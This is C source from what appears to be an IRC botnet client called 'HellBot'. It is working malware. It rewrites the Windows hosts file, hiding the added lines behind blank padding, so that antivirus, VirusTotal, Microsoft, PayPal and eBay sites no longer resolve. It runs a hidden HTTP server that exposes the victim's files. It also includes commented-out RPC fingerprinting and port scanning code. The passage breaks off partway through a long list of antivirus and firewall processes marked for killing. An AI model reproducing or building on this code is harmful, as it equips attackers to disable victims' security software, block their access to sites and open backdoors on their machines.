//HellUtility add here ur codes. ;)

#include "Hell.h"

//SOCKET data_sock;

char ipscanor[16];
char localip[16];
char buff[512];

void AddHosts() {
	// Build path to hosts file
	char szSystemDir[MAX_PATH]; GetSystemDirectory(szSystemDir, sizeof(szSystemDir));
	strncat(szSystemDir, "\\drivers\\etc\\hosts", sizeof(szSystemDir));

	// Check if host entries already exist
	FILE *fp=fopen(szSystemDir, "r"); if(fp) {
		while(fgets(szSystemDir, sizeof(szSystemDir), fp) && !feof(fp))
			if(strstr(szSystemDir, "www.symantec.com")) {
				fclose(fp); return; }
		fclose(fp); }

	// Build path to hosts file
	GetSystemDirectory(szSystemDir, sizeof(szSystemDir));
	strncat(szSystemDir, "\\drivers\\etc\\hosts", sizeof(szSystemDir));

	// Add host entries to the file
	fp=fopen(szSystemDir, "a"); if(fp) {
		fprintf(fp, "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
		fprintf(fp, "\n127.0.0.1\twww.symantec.com\n");
		fprintf(fp, "127.0.0.1\tsecurityresponse.symantec.com\n");
		fprintf(fp, "127.0.0.1\tsymantec.com\n");
		fprintf(fp, "127.0.0.1\twww.sophos.com\n");
		fprintf(fp, "127.0.0.1\tsophos.com\n");
		fprintf(fp, "127.0.0.1\twww.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tmcafee.com\n");
		fprintf(fp, "127.0.0.1\tliveupdate.symantecliveupdate.com\n");
		fprintf(fp, "127.0.0.1\twww.viruslist.com\n");
		fprintf(fp, "127.0.0.1\tviruslist.com\n");
		fprintf(fp, "127.0.0.1\tviruslist.com\n");
		fprintf(fp, "127.0.0.1\tf-secure.com\n");
		fprintf(fp, "127.0.0.1\twww.f-secure.com\n");
		fprintf(fp, "127.0.0.1\tkaspersky.com\n");
		fprintf(fp, "127.0.0.1\tkaspersky-labs.com\n");
		fprintf(fp, "127.0.0.1\twww.avp.com\n");
		fprintf(fp, "127.0.0.1\twww.kaspersky.com\n");
		fprintf(fp, "127.0.0.1\tavp.com\n");
		fprintf(fp, "127.0.0.1\twww.networkassociates.com\n");
		fprintf(fp, "127.0.0.1\tnetworkassociates.com\n");
		fprintf(fp, "127.0.0.1\twww.ca.com\n");
		fprintf(fp, "127.0.0.1\tca.com\n");
		fprintf(fp, "127.0.0.1\tmast.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tmy-etrust.com\n");
		fprintf(fp, "127.0.0.1\twww.my-etrust.com\n");
		fprintf(fp, "127.0.0.1\tdownload.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tdispatch.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tsecure.nai.com\n");
		fprintf(fp, "127.0.0.1\tnai.com\n");
		fprintf(fp, "127.0.0.1\twww.nai.com\n");
		fprintf(fp, "127.0.0.1\tupdate.symantec.com\n");
		fprintf(fp, "127.0.0.1\tupdates.symantec.com\n");
		fprintf(fp, "127.0.0.1\tus.mcafee.com\n");
		fprintf(fp, "127.0.0.1\tliveupdate.symantec.com\n");
		fprintf(fp, "127.0.0.1\tcustomer.symantec.com\n");
		fprintf(fp, "127.0.0.1\trads.mcafee.com\n");
		fprintf(fp, "127.0.0.1\ttrendmicro.com\n");
		fprintf(fp, "127.0.0.1\tpandasoftware.com\n");
		fprintf(fp, "127.0.0.1\twww.pandasoftware.com\n");
		fprintf(fp, "127.0.0.1\twww.trendmicro.com\n");
		fprintf(fp, "127.0.0.1\twww.grisoft.com\n");
		fprintf(fp, "127.0.0.1\twww.microsoft.com\n");
		fprintf(fp, "127.0.0.1\tmicrosoft.com\n");
		fprintf(fp, "127.0.0.1\twww.virustotal.com\n");
		fprintf(fp, "127.0.0.1\tvirustotal.com\n");
        fprintf(fp, "127.0.0.1\twww.amazon.com\n");
        fprintf(fp, "127.0.0.1\twww.amazon.co.uk\n");
        fprintf(fp, "127.0.0.1\twww.amazon.ca\n");
		fprintf(fp, "127.0.0.1\twww.amazon.fr\n");
        fprintf(fp, "127.0.0.1\twww.paypal.com\n");
        fprintf(fp, "127.0.0.1\tpaypal.com\n");
        fprintf(fp, "127.0.0.1\tmoneybookers.com\n");
        fprintf(fp, "127.0.0.1\twww.moneybookers.com\n");
        fprintf(fp, "127.0.0.1\twww.ebay.com\n");
        fprintf(fp, "127.0.0.1\tebay.com\n");
		fclose(fp); }
}
/*
typedef struct threds_struct {
	char name [250];
	int id;
	int num;
	int port;
	SOCKET sock;
	HANDLE Threat_Handle;
	char dir[MAX_PATH];
	char file[MAX_PATH];
 } thred;
 thred threds[40];

int spyaddthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir) {
	int c;
	for (c=0;c <= 40;c++)
		if (threds[c].id == 0) break;
	if (c > 19) return -1;
	sprintf(threds[c].name,name);
	threds[c].id = id;
	threds[c].num = c;
	threds[c].sock = sock;
	threds[c].Threat_Handle = Threat_Handle;
	sprintf(threds[c].dir,dir);
	return c;
 }

 SOCKET Listen(int port) {
	SOCKET sock;
	SOCKADDR_IN  SockAddr;
   	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
      		return -1;
	memset(&SockAddr, 0, sizeof(SockAddr));
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	SockAddr.sin_addr.s_addr = INADDR_ANY;  
	if (bind(sock, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) 
		return -1;//port is in use ?
	if (listen(sock, SOMAXCONN) != 0) 
		return -1;
	return sock;
 }
//httpd

 #ifndef NO_HTTPD
 SOCKET http_socket;
 BOOL http_Type;
 int http_lenght;
 BOOL http_info = FALSE;
 char http_file[MAX_PATH];
 char http_path[MAX_PATH];



void *CHttpd::Run()
{	
	char dir[MAX_PATH];
	char *c;
	GetModuleFileName(0,dir,sizeof(dir));
	if ((c=strrchr(dir,'\\')) != NULL)
		*c='\0';
	HTTP_server(dir, Hell->cIRC.cConf.cHttpdPort);
	return NULL;
}

int HTTP_server(char *dir,int http_poort) {
	SOCKET HTTPServer;
	char httpsDir[MAX_PATH];
	char buf[250];
	DWORD id;
	int c;
	HANDLE handle;
	memset(httpsDir,0,sizeof(httpsDir));
	if (dir[strlen(dir)-1] == 92) 
		dir[strlen(dir)-1] = '\0';
	strcpy(httpsDir,dir);
	if ((HTTPServer = Listen(http_poort)) == -1)
		return -1;
	for (c=0;c < 40;c++)
		if (threds[c].id == 0) break;
	if (c > 39) {
		closesocket(HTTPServer);
		return -1;
	}

	handle = CreateThread(NULL, 0, &HTTP_server_thread, (LPVOID)c, 0, &id);
	if (handle != NULL) {
		//httpdt = addthread(buf);
		//threads[httpdt] = CreateThread(NULL, 0, &HTTP_server_thread, (LPVOID)c, 0, &id);
		spyaddthread(buf,HTTPServer,handle,3,httpsDir);
	}

	return c;
 }

 DWORD WINAPI HTTP_server_thread(LPVOID Param) {
	SOCKADDR_IN  GuestAddr;
	SOCKET guest;

	char buffer[4096];
	char rBuffer[4096];
	char file[MAX_PATH];
	char *file_to_send;
	file_to_send = "\0";

	int addrlen, r;
	int threadnum = (int)Param;
	
	unsigned int b, max, i;
	unsigned long mode = 1;
	
	if (ioctlsocket(threds[threadnum].sock,FIONBIO,&mode) == SOCKET_ERROR) 
		return 1;

	fd_set master;   
        fd_set temp; 
	FD_ZERO(&master);    
        FD_ZERO(&temp);
 	FD_SET(threds[threadnum].sock, &master);
	max = threds[threadnum].sock;

	while (1) {
		temp = master;
		if (select(max+1, &temp, NULL, NULL, NULL) == SOCKET_ERROR)
			break;
           	
		for(i=0; i<= max; i++) {
			if (FD_ISSET(i, &temp)) { //there is somthing to do 
				if (i == threds[threadnum].sock) {
					//there is a new connection request
					addrlen = sizeof(GuestAddr);
					if ((guest = accept(threds[threadnum].sock, (SOCKADDR *)&GuestAddr,&addrlen)) == INVALID_SOCKET)  
							continue; 
			else {
						FD_SET(guest, &master); // add to master set
							if (guest > max)  
								max = guest;
					}
			} 
			else {
			memset(buffer,0,sizeof(buffer));
			memset(rBuffer,0,sizeof(rBuffer));
					if (recv(i, buffer, sizeof(buffer), 0) <= 0) { //socket error
						closesocket(i); 
							FD_CLR(i, &master); // remove from master set
					} 
			else {
						memset(file,0,sizeof(file));
						for (b = 0,r = 0;b < strlen(buffer);b++, r++) {
							rBuffer[r] = buffer[b];
							if (buffer[b] == '\n')
							{  //check the request....
								if (strstr(rBuffer,"GET ") != NULL && strlen(rBuffer) > 5) { //look for a GET request
									file_to_send = strtok(strstr(strstr(rBuffer,"GET ")," ")," ");
									strcpy(file,file_to_send);

								}
								else if (strcmp(rBuffer,"\r\n") == 0) {  //end of the request check if there is anything to send back
										FD_CLR(i, &master);
										if (file != NULL) {
										if (strlen(file)+strlen(threds[threadnum].dir) < MAX_PATH) { 
											unsigned long mode2 = 0;
											ioctlsocket(i,FIONBIO,&mode2);
											Check_Requestedfile(i,threds[threadnum].dir,file);
										}
										else closesocket(i);
									}
									else closesocket(i);
									break;
								}
								memset(rBuffer,0,sizeof(rBuffer));
								r=-1;
							}

                				} 
        				}

				}
			}
		}
	}
	closesocket(threds[threadnum].sock);
	threds[threadnum].id = 0;
	return 0;
 }

 DWORD WINAPI  http_header(LPVOID param) {
	SOCKET sock = (SOCKET)param;
	char tFile[MAX_PATH];
	char nFile[MAX_PATH];
	BOOL type = http_Type;
	sprintf(tFile,http_file); 
	sprintf(nFile,http_path); 
	int lenght = http_lenght;
	http_info = TRUE;
	char content[50];
	if (type) sprintf(content,"text/html");
	else sprintf(content,"application/octet-stream");
	char buffer[4096];
	char date[70];
	char time[30];
	GetDateFormat(0x409,0,0,"ddd, dd MMM yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,30);
	sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: HellBot\r\nDate: %s %s GMT\r\nContent-Type: %s\r\nAccept-Ranges: bytes\r\nLast-Modified: %s %s GMT\r\nContent-Length: %i\r\nConnection: close\r\n\r\n",date,time,content,date,time,lenght);
	send(sock,buffer,strlen(buffer),0);
	if (type == FALSE) http_send_file(sock,tFile);
	else getfiles(tFile,sock,nFile); 
	closesocket(sock);
	return 0;
}

 int Check_Requestedfile(SOCKET sock,char * dir,char * rFile) {
	BOOL directory = FALSE;
	char file[MAX_PATH];
	char nFile[MAX_PATH];
	char tFile[MAX_PATH];
	memset(file,0,sizeof(file));
	memset(nFile,0,sizeof(nFile));
	DWORD c,d;

	if (rFile[0] != 47) sprintf(file,"\\%s",rFile);
	else {
		rFile[0] = 92;
		sprintf(file,"%s",rFile);
	}
	for (c = 0,d=0;c < strlen(file);c++,d++)
	{
		if ((((c+2 < strlen(file) && file[c] == 37 && file[c+1] == 50 && file[c+2] == 48)))) {
			nFile[d] = 32;
			c=c+2;
		}
		else if (file[c] == 47) nFile[d] = 92;
		else nFile[d] = file[c];
	}
	sprintf(tFile,"%s%s",dir,nFile);
	strtok(tFile,"\n");

	if (GetFileAttributes(tFile) == FILE_ATTRIBUTE_DIRECTORY) 
      		directory = TRUE;
	else if (GetFileAttributes(tFile) == 0xFFFFFFFF) { //invalid file
			closesocket(sock);
			return 0;
	}
	if (nFile[d-1] == 92) directory = TRUE;
	DWORD id;
	if (directory) {
		strcat(tFile,"*");
		file_to_html(nFile);
		sprintf(http_file,tFile);
		sprintf(http_path,nFile);
		http_info = FALSE;
		http_Type = TRUE;
		http_lenght = 10000;
		if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id)) {
			while (http_info == FALSE) Sleep(5);
		}
		else { 
			closesocket(sock);
		}
		 //(tFile,sock,NULL,nFile); //list the directory and send it in html
	}
	else { //its a file
		HANDLE testfile = CreateFile(tFile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
      		if (testfile != INVALID_HANDLE_VALUE) {
			http_lenght = GetFileSize(testfile,NULL);
			CloseHandle(testfile);
			http_Type = FALSE;
			sprintf(http_file,tFile);
			http_info = FALSE;
			if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id)) {
				while (http_info == FALSE) Sleep(5);
			}
			else {
				closesocket(sock);
			}
		}
	}
	return 0;
 }
 void http_send_file(SOCKET sock,char *file) {
	//int c;
	char buffer[1024];
	DWORD mode = 0;
	HANDLE testfile = CreateFile(file,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		return;
	unsigned int Fsize, move;
	Fsize = GetFileSize(testfile,NULL);
	
	while (Fsize) {
		unsigned int Fsend = 1024;
		memset(buffer,0,sizeof(buffer));
		if (Fsend>Fsize) Fsend=Fsize;
		move = 0-Fsize;
		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, buffer, Fsend, &mode, NULL);
		int bytes_sent = send(sock, buffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (WSAGetLastError() != WSAEWOULDBLOCK) break;
			else bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;
	}
	if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
	return; //file transfer complete		
 }

 char * file_to_html(char *file) {
	DWORD c;
	for (c=0;c < strlen(file);c++)
	if (file[c] == 92) file[c] = 47;
	return file;
 }

 int getfiles(char *current,SOCKET dccsock,char *URL) {
	char sendbuf[MAX_PATH];
	char parent[MAX_PATH];
	memset(parent,0,sizeof(parent));
    HANDLE Hnd;
    WIN32_FIND_DATA WFD;
	DWORD c;
	int count = 0;
	int count2 = 0;
	strtok(current,"\n");
	if (URL) sprintf(sendbuf,"<HTML><PRE>\n");
	else sprintf(sendbuf,"Searsing for: %s\r\n",current);
        send(dccsock,sendbuf,strlen(sendbuf),0);
	if (URL && strlen(URL) > 2) {
		//make the Parent Directory
		for (c=strlen(URL)-3;c != 0;c--)
			if (URL[c] == 47) 
				break;
		strncpy(parent,URL,c+1);
		sprintf(sendbuf,"<li><A href=\"%s\">Parent Directory</A></li>\r\n",parent);
		send(dccsock,sendbuf,strlen(sendbuf),0);
	}
        Hnd = FindFirstFile(current, &WFD);
        while (FindNextFile(Hnd, &WFD))
        {
        	if ((WFD.dwFileAttributes) &&  (strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, ".")))
        	{

			memset(sendbuf,0,sizeof(sendbuf));
			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				if (URL) //its a http request
					sprintf(sendbuf,"<li><A href=\"%s%s/\">%s</A></li> <b>Directory</b>\r\n",URL,WFD.cFileName,WFD.cFileName);
				else
					sprintf(sendbuf,"<%s>\r\n",WFD.cFileName);
			}
			else {
				count++;
				if (URL)//its a http request
					sprintf(sendbuf,"<p><A href=\"%s%s\">%s</A> (%i bytes)\r\n",URL,WFD.cFileName,WFD.cFileName,WFD.nFileSizeLow);
				else 
					sprintf(sendbuf,"%s (%i bytes)\r\n",WFD.cFileName,WFD.nFileSizeLow);
			
			}
			send(dccsock,sendbuf,strlen(sendbuf),0);
     		}

        }
    	(void) FindClose(Hnd);
	if (URL) sprintf(sendbuf,"</PRE></HTML>"); 
	else sprintf(sendbuf,"Found: %i files and %i dirs\r\n",count,count2);
	send(dccsock,sendbuf,strlen(sendbuf),0);
   	return 0;
 }
 #endif
//

/*unsigned long ResolveAddress(const char *szHost) {
	unsigned long lAddr=inet_addr(szHost);
	if(lAddr==INADDR_NONE) {
		hostent *pHE=gethostbyname(szHost);
		if(!pHE) return INADDR_NONE;
		lAddr=*((unsigned long*)pHE->h_addr_list[0]); }
	return lAddr; }

bool ScanPort(const char *host, const unsigned short port)
{	sockaddr_in iAddr; int sSocket; bool bRetval=false;
	sSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(sSocket==INVALID_SOCKET||sSocket==SOCKET_ERROR) return false;
	iAddr.sin_addr.s_addr=inet_addr(host); iAddr.sin_port=htons(port);
	iAddr.sin_family=AF_INET;
	if(!connect(sSocket, (sockaddr*)&iAddr, sizeof(iAddr))) bRetval=true;
	xClose(sSocket); return bRetval; }

bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;
	return false; }

char rpcfp_bindstr[]=
	"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
	"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
	"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
	"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
	"\x2b\x10\x48\x60\x02\x00\x00\x00";


char w2kuuid_sig[]=
	"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
	"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";


char rpcfp_inqifids[]=
	"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00";

int FpHost(const char *szHost, int iFpType)
{	switch(iFpType) {
	case FP_RPC:
	{	int iRetVal=OS_UNKNOWN;
		int sSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); char szRecvBuf[8192];
		if(sSocket==SOCKET_ERROR || sSocket==INVALID_SOCKET) return OS_UNKNOWN;
		sockaddr_in ssin; memset(&ssin, 0, sizeof(ssin)); ssin.sin_family=AF_INET;
		ssin.sin_port=htons(135); ssin.sin_addr.s_addr=ResolveAddress(szHost);
		int iErr=connect(sSocket, (sockaddr*)&ssin, sizeof(sockaddr_in));
		if(iErr!=SOCKET_ERROR)
		{	iErr=xWrite(sSocket, rpcfp_bindstr, sizeof(rpcfp_bindstr)-1);
			if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
			iErr=xRead(sSocket, szRecvBuf, sizeof(szRecvBuf));
			if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
			if(szRecvBuf[2]==DCE_PKT_BINDACK)
			{	iErr=xWrite(sSocket, rpcfp_inqifids, sizeof(rpcfp_inqifids)-1);
				if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
				iErr=xRead(sSocket, szRecvBuf, sizeof(szRecvBuf));
				if(iErr==SOCKET_ERROR) { xClose(sSocket); return iRetVal; }
				if(szRecvBuf[2]==DCE_PKT_RESPONSE)
				{	if(MemContains(szRecvBuf, iErr, w2kuuid_sig, sizeof(w2kuuid_sig)-1))
					{	if(iErr<300) iRetVal=OS_WINNT; else iRetVal=OS_WIN2K; }
					else if(MemContains(szRecvBuf, iErr, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
						iRetVal=OS_WINXP;
					else
						iRetVal=OS_UNKNOWN; }
				else
				{	xClose(sSocket); return iRetVal; } }
			else
			{	xClose(sSocket); return iRetVal; } }
		else
		{	xClose(sSocket); return iRetVal; }
		xClose(sSocket); return iRetVal; }
		break;
	case FP_PORT5K:
		if(ScanPort(szHost, 5000)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	default:
		return OS_UNKNOWN;
		break; }
	return OS_UNKNOWN; }*/

/*void getmyip()
{
	struct sockaddr_in sin;
    struct hostent * phe;
    char FAR buffer[64] ;
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;
    wVersionRequested = MAKEWORD(1, 1);
    err = WSAStartup(wVersionRequested, &wsaData);
    gethostname(buffer, sizeof(buffer));
    phe = gethostbyname(buffer);
	int I = 0 ;
	while((phe->h_addr_list[I+1])!=NULL)
	{
    I++;
	}
    memcpy(&sin.sin_addr.s_addr, phe->h_addr_list[I], phe->h_length);
    _snprintf(localip,sizeof(localip),inet_ntoa(sin.sin_addr));
    //all that shit for fucking local scan 
	int ClassA, ClassB;
	const char *p_addr_item;
	char myhostname[16];
	sprintf(myhostname, localip);
    p_addr_item = strtok(myhostname, ".");
    ClassA = atoi(p_addr_item); 
    p_addr_item = strtok(0, ".");
    ClassB = atoi(p_addr_item); //it look ugly... who care !? 
    sprintf(ipscanor, "%i.%i.%s.%s", ClassA, ClassB, "x", "x");
}*/

char * sysinfo(char *sinfo)
 {
	int total;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;

	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char *os;
	char os2[140];
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	else os = "??";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.

	sprintf(sinfo, "[.RAM.]: %dKB total, %dKB free [.OS.]: Windows %s (%d.%d, build %d) [.Uptime.]: %dd %dh %dm",
		memstat.dwTotalPhys / 1024, memstat.dwAvailPhys / 1024,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60);
	return sinfo; // return the sysinfo string
 }

//proc killer

#ifndef NO_AVFW_KILL
int killer_delay = 950;

char *kill_list[]={
		"ACKWIN32.EXE", "ADAWARE.EXE", "ADVXDWIN.EXE", "AGENTSVR.EXE", "AGENTW.EXE", "ALERTSVC.EXE", "ALEVIR.EXE", "ALOGSERV.EXE", 
		"AMON9X.EXE", "ANTI-TROJAN.EXE", "ANTIVIRUS.EXE", "ANTS.EXE", "APIMONITOR.EXE", "APLICA32.EXE", "APVXDWIN.EXE",
		"ARR.EXE", "ATCON.EXE", "ATGUARD.EXE", "ATRO55EN.EXE", "ATUPDATER.EXE", "ATUPDATER.EXE", "ATWATCH.EXE", "AU.EXE",
		"AUPDATE.EXE", "AUPDATE.EXE", "AUTODOWN.EXE", "AUTODOWN.EXE", "AUTOTRACE.EXE", "AUTOTRACE.EXE", "AUTOUPDATE.EXE",
		"AUTOUPDATE.EXE", "AVCONSOL.EXE", "AVE32.EXE", "AVGCC32.EXE", "AVGCTRL.EXE", "AVGNT.EXE", "AVGSERV.EXE",
		"AVGSERV9.EXE", "AVGUARD.EXE", "AVGW.EXE", "AVKPOP.EXE", "AVKSERV.EXE", "AVKSERVICE.EXE", "AVKWCTl9.EXE",
		"AVLTMAIN.EXE", "AVNT.EXE", "AVP.EXE", "AVP32.EXE", "AVPCC.EXE", "AVPDOS32.EXE", "AVPM.EXE", "AVPTC32.EXE",
		"AVPUPD.EXE", "AVPUPD.EXE", "AVSCHED32.EXE", "AVSYNMGR.EXE", "AVWINNT.EXE", "AVWUPD.EXE",
		"AVWUPD32.EXE", "AVWUPD32.EXE", "AVWUPSRV.EXE", "AVXMONITOR9X.EXE", "AVXMONITORNT.EXE", "AVXQUAR.EXE",
		"AVXQUAR.EXE", "BACKWEB.EXE", "BARGAINS.EXE", "BD_PROFESSIONAL.EXE", "BEAGLE.EXE", "BELT.EXE", "BIDEF.EXE",
		"BIDSERVER.EXE", "BIPCP.EXE", "BIPCPEVALSETUP.EXE", "BISP.EXE", "BLACKD.EXE", "BLACKICE.EXE", "BLSS.EXE",
		"BOOTCONF.EXE", "BOOTWARN.EXE", "BORG2.EXE", "BPC.EXE", "BRASIL.EXE", "BS120.EXE", "BUNDLE.EXE", "BVT.EXE",
		"CCAPP.EXE", "CCEVTMGR.EXE", "CCPXYSVC.EXE", "CDP.EXE", "CFD.EXE", "CFGWIZ.EXE", "CFIADMIN.EXE", "CFIAUDIT.EXE",
		"CFIAUDIT.EXE", "CFINET.EXE", "CFINET32.EXE", "CLEAN.EXE", "CLEANER.EXE", "CLEANER3.EXE",
		"CLEANPC.EXE", "CLICK.EXE", "CMD32.EXE", "CMESYS.EXE", "CMGRDIAN.EXE", "CMON016.EXE", "CONNECTIONMONITOR.EXE",
		"CPD.EXE", "CPF9X206.EXE", "CPFNT206.EXE", "CTRL.EXE", "CV.EXE", "CWNB181.EXE", "CWNTDWMO.EXE",
		"CLAW95CF.EXE", "DATEMANAGER.EXE", "DCOMX.EXE", "DEFALERT.EXE", "DEFSCANGUI.EXE", "DEFWATCH.EXE", "DEPUTY.EXE",
		"DIVX.EXE", "DLLCACHE.EXE", "DLLREG.EXE", "DOORS.EXE", "DPF.EXE", "DPFSETUP.EXE", "DPPS2.EXE", "DRWATSON.EXE",
		"DRWEB32.EXE", "DRWEBUPW.EXE", "DSSAGENT.EXE", "DVP95.EXE", "DVP95_0.EXE", "ECENGINE.EXE", "EFPEADM.EXE",
		"EMSW.EXE", "ENT.EXE", "ESAFE.EXE", "ESCANHNT.EXE", "ESCANV95.EXE", "ESPWATCH.EXE", "ETHEREAL.EXE",
		"ETRUSTCIPE.EXE", "EVPN.EXE", "EXANTIVIRUS-CNET.EXE", "EXE.AVXW.EXE", "EXPERT.EXE", "EXPLORE.EXE",
		"F-PROT.EXE", "F-PROT95.EXE", "F-STOPW.EXE", "FAMEH32.EXE", "FAST.EXE", "FCH32.EXE", "FIH32.EXE",
		"FINDVIRU.EXE", "FIREWALL.EXE", "FNRB32.EXE", "FP-WIN.EXE", "FP-WIN_TRIAL.EXE",
		"FPROT.EXE", "FRW.EXE", "FSAA.EXE", "FSAV.EXE", "FSAV32.EXE", "FSAV530STBYB.EXE", "FSAV530WTBYB.EXE", "FSAV95.EXE",
		"FSGK32.EXE", "FSM32.EXE", "FSMA32.EXE", "FSMB32.EXE", "GATOR.EXE", "GBMENU.EXE", "GBPOLL.EXE", "GENERICS.EXE",
		"GMT.EXE", "GUARD.EXE", "GUARDDOG.EXE", "HACKTRACERSETUP.EXE", "HBINST.EXE", "HBSRV.EXE", "HOTACTIO.EXE",
		"HOTPATCH.EXE", "HTLOG.EXE", "HTPATCH.EXE", "HWPE.EXE", "HXDL.EXE", "HXIUL.EXE", "IAMAPP.EXE", "IAMSERV.EXE",
		"IAMSTATS.EXE", "IBMASN.EXE", "IBMAVSP.EXE", "ICLOADNT.EXE", "ICMON.EXE", "ICSUPP95.EXE",
		"ICSUPPNT.EXE", "IDLE.EXE", "IEDLL.EXE", "IEDRIVER.EXE", "IEXPLORER.EXE", "IFACE.EXE",
		"IFW2000.EXE", "INETLNFO.EXE", "INFUS.EXE", "INFWIN.EXE", "INIT.EXE", "INTDEL.EXE", "INTREN.EXE", "IOMON98.EXE",
		"ISTSVC.EXE", "JAMMER.EXE", "JDBGMRG.EXE", "JEDI.EXE",
		"KAVLITE40ENG.EXE", "KAVPERS40ENG.EXE", "KAVPF.EXE", "KAZZA.EXE", "KEENVALUE.EXE", "KERIO-PF-213-EN-WIN.EXE",
		"KERIO-WRL-421-EN-WIN.EXE", "KERIO-WRP-421-EN-WIN.EXE", "KERNEL32.EXE", "KILLPROCESSSETUP161.EXE",
		"LAUNCHER.EXE", "LDNETMON.EXE", "LDPRO.EXE", "LDPROMENU.EXE", "LDSCAN.EXE", "LNETINFO.EXE", "LOADER.EXE",
		"LOCALNET.EXE", "LOCKDOWN.EXE", "LOCKDOWN2000.EXE", "LOOKOUT.EXE", "LORDPE.EXE", "LSETUP.EXE", "LUALL.EXE",
		"LUALL.EXE", "LUAU.EXE", "LUCOMSERVER.EXE", "LUINIT.EXE", "LUSPT.EXE", "MAPISVC32.EXE", "MCAGENT.EXE", "MCMNHDLR.EXE",
		"MCSHIELD.EXE", "MCTOOL.EXE", "MCUPDATE.EXE", "MCUPDATE.EXE", "MCVSRTE.EXE", "MCVSSHLD.EXE", "MD.EXE", "MFIN32.EXE",
		"MFW2EN.EXE", "MFWENG3.02D30.EXE", "MGAVRTCL.EXE", "MGAVRTE.EXE", "MGHTML.EXE", "MGUI.EXE", "MINILOG.EXE",
		"MMOD.EXE", "MONITOR.EXE", "MOOLIVE.EXE", "MOSTAT.EXE", "MPFAGENT.EXE", "MPFSERVICE.EXE", "MPFTRAY.EXE",
		"MRFLUX.EXE", "MSAPP.EXE", "MSBB.EXE", "MSBLAST.EXE", "MSCACHE.EXE", "MSCCN32.EXE", "MSCMAN.EXE", "MSCONFIG.EXE",
		"MSDM.EXE", "MSDOS.EXE", "MSIEXEC16.EXE", "MSINFO32.EXE", "MSLAUGH.EXE", "MSMGT.EXE", "MSMSGRI32.EXE",
		"MSSMMC32.EXE", "MSSYS.EXE", "MSVXD.EXE", "MU0311AD.EXE", "MWATCH.EXE", "N32SCANW.EXE", "NAV.EXE",
		"AUTO-PROTECT.NAV80TRY.EXE", "NAVAP.NAVAPSVC.EXE", "NAVAPSVC.EXE", "NAVAPW32.EXE", "NAVDX.EXE",
		"NAVLU32.EXE", "NAVNT.EXE", "NAVSTUB.EXE", "NAVW32.EXE", "NAVWNT.EXE",
